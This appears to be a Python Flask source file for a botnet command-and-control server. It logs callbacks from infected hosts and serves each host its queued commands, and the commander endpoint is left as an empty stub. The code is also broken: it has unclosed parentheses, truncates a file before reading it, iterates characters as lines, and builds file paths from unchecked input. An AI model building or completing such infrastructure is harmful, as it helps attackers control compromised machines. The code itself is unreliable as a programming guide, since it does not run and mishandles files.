"""
Process POST/GET requests from clients/commander, distribute commands and keep 
track of bot callbacks
@author: degenerat3
"""

from flask import Flask, request
import os
import datetime

app = Flask(__name__)


@app.route('/api/callback')
def process_callbacks():
    content = request.json
    hostname = content['hostname']
    hostname = hostname.lower()
    calltime = content['time']
    if os.path.isfile("/tmp/cc/callbacks.txt"):
        with open("/tmp/cc/callbacks.txt", "w+") as f:
            data = f.read()
            if hostname in data:
                new_d = ""
                for line in data:
                    if hostname in line:
                        new_l = hostname + ":    " + calltime + "\n"
                        new_d += new_l
                    else:
                        new_d += line
                f.write(new_d)
            else:
                data += hostname + ":   " + calltime + "\n"
                f.write(data)
    else:
        with open("/tmp/cc/callbacks.txt", "w+") as f:
            s = hostname + ":   " + calltime + "\n"
            f.write(s)
    
    if os.path.isfile("/tmp/cc/calls.log"):
        with open("/tmp/cc/calls.log", "a") as f:
            f.write(hostname + ":   " + calltime + "\n"
    else:
        with open("/tmp/cc/calls.log", "w+") as f:
            f.write(hostname + ":   " + calltime + "\n"
    
    return

@app.route('/api/commands/<host>')
def give_commands(host):
    coms = ""
    try:
        dir_str = "/tmp/cc/hosts/" + host + ".txt"
        with open(dir_str, "r") as f:
            coms = f.read()
    except:
        coms = ""
    return coms

@app.route('/api/commander')
def proc_inc_coms():
    
    return


